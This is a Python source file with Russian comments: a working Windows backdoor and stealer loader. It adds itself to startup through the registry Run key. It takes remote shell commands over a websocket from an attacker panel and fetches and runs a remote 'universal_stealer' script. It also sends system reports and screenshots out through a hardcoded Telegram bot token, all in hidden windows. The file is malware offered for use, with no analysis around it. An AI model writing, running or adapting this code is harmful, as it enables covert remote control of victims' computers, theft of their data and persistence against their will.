import websocket
import time
import subprocess
import os
import sys
import winreg as reg
import requests
import base64
import platform
import socket

# --- ВАЖНО: Убраны все лишние библиотеки (tkinter, pycaw, playsound) ---

# --- Конфигурация (та же самая) ---
BOT_TOKEN = "7650238850:AAFFcTP5uesNyAreZbW5_gL36brFObm2e34"
CHAT_ID = "1640138978"

# --- Системные функции (без изменений) ---
def get_extended_system_info():
    try:
        user_info = f"{os.getlogin()}@{socket.gethostname()}"; os_info = platform.platform(); cpu_info = platform.processor()
        try: gpu_info = subprocess.check_output("wmic path win32_VideoController get name", creationflags=subprocess.CREATE_NO_WINDOW).decode().split('\n')[1].strip()
        except: gpu_info = "Не удалось получить"
        try: ram_info = f"{float(subprocess.check_output('wmic ComputerSystem get TotalPhysicalMemory', creationflags=subprocess.CREATE_NO_WINDOW).decode().split(chr(10))[1].strip()) / 1073741824:.2f} GB"
        except: ram_info = "Не удалось получить"
        try: drives_info = subprocess.check_output("wmic logicaldisk get caption,size,freespace", creationflags=subprocess.CREATE_NO_WINDOW).decode()
        except: drives_info = "Не удалось получить"
        try: ip_info = subprocess.check_output("ipconfig /all", creationflags=subprocess.CREATE_NO_WINDOW).decode('cp866', errors='ignore')
        except: ip_info = "Не удалось получить"
        final_report = (f"======[ ИНФОРМАЦИЯ О СИСТЕМЕ ]======\n\n[+] Основная информация:\n    Пользователь: {user_info}\n    ОС: {os_info}\n    Процессор: {cpu_info}\n    Видеокарта: {gpu_info}\n    ОЗУ: {ram_info}\n\n================[ КОНЕЦ ОТЧЕТА ]================")
        return final_report
    except Exception as e: return f"Критическая ошибка при сборе информации: {e}"

def add_to_startup():
    try:
        exe_path = sys.executable; key_name = 'SilentSystemManager'; key = reg.HKEY_CURRENT_USER; key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        with reg.OpenKey(key, key_path, 0, reg.KEY_SET_VALUE) as rk: reg.SetValueEx(rk, key_name, 0, reg.REG_SZ, exe_path)
    except: pass

# --- Основной цикл подключения (сильно урезанный) ---
def connect(base_url, ws_url):
    while True:
        try:
            ws = websocket.create_connection(ws_url)
            ws.send(f"HOSTNAME:{socket.gethostname()}")
            while True:
                command = ws.recv()

                # --- ГЛАВНАЯ И ЕДИНСТВЕННАЯ ФУНКЦИЯ СТИЛЛЕРА ---
                if command == 'run_stealer':
                    script_path = ''
                    try:
                        script_url = f"{base_url}/scripts/universal_stealer.py"
                        r = requests.get(script_url, timeout=15)
                        r.raise_for_status()

                        temp_dir = os.getenv('TEMP')
                        script_path = os.path.join(temp_dir, 'system_module.py')
                        with open(script_path, 'w', encoding='utf-8') as f:
                            f.write(r.text)

                        # Предполагаем, что python есть в PATH
                        proc = subprocess.Popen(['python', script_path], stdout=subprocess.PIPE, stderr=subprocess.PIPE, creationflags=subprocess.CREATE_NO_WINDOW)
                        stdout, stderr = proc.communicate(timeout=120)

                        if proc.returncode == 0:
                            ws.send("Внешний стиллер успешно отработал.")
                        else:
                            ws.send(f"Ошибка выполнения внешнего стиллера:\n{stderr.decode('cp866', errors='ignore')}")
                    except Exception as e:
                        ws.send(f"Критическая ошибка запуска стиллера: {e}")
                    finally:
                        if script_path and os.path.exists(script_path):
                            os.remove(script_path)

                # --- БАЗОВЫЕ КОМАНДЫ РАЗВЕДКИ И УПРАВЛЕНИЯ ---
                elif command == 'sysinfo':
                    report_path = ''
                    try:
                        info_text = get_extended_system_info(); temp_dir = os.getenv('TEMP'); report_path = os.path.join(temp_dir, f'report_{socket.gethostname()}.txt')
                        with open(report_path, 'w', encoding='utf-8') as f: f.write(info_text)
                        tg_url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument";
                        with open(report_path, 'rb') as doc_file: requests.post(tg_url, data={'chat_id': CHAT_ID, 'caption': f'Отчет по системе {socket.gethostname()}'}, files={'document': doc_file}, timeout=30)
                        ws.send("Отчет по системе успешно отправлен в Telegram.")
                    except Exception as e: ws.send(f"Ошибка при отправке отчета: {e}")
                    finally:
                        if report_path and os.path.exists(report_path): os.remove(report_path)

                elif command == 'screenshot':
                    screenshot_path = ''
                    try:
                        # Для скриншота нужна Pillow, поэтому импортируем ее прямо здесь
                        from PIL import ImageGrab
                        s = ImageGrab.grab(); screenshot_path = os.path.join(os.getenv('TEMP'),'s.png'); s.save(screenshot_path)
                        tg_url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
                        with open(screenshot_path,'rb') as pf: requests.post(tg_url,data={'chat_id':CHAT_ID},files={'photo':pf},timeout=15)
                        ws.send("Скриншот отправлен в Telegram.")
                    except Exception as e: ws.send(f"Ошибка скриншота: {e}")
                    finally:
                        if screenshot_path and os.path.exists(screenshot_path): os.remove(screenshot_path)

                elif command.startswith('cd '):
                    try:os.chdir(command[3:].strip()); ws.send('Директория изменена')
                    except Exception as e: ws.send(str(e))

                else:
                    try:
                        proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, creationflags=subprocess.CREATE_NO_WINDOW)
                        output = proc.stdout.read() + proc.stderr.read()
                        if not output: ws.send('(команда не дала вывода)')
                        else: ws.send(output.decode('cp866', errors='replace'))
                    except Exception as e: ws.send(str(e))
        except Exception:
            time.sleep(20)

if __name__ == '__main__':
    add_to_startup()
    WS_HOST = 'wss://my-cool-panel-production.up.railway.app/ws' # НЕ ЗАБУДЬ СВОЙ АДРЕС
    BASE_URL = WS_HOST.replace('wss://', 'https://').split('/ws')[0]
    connect(BASE_URL, WS_HOST)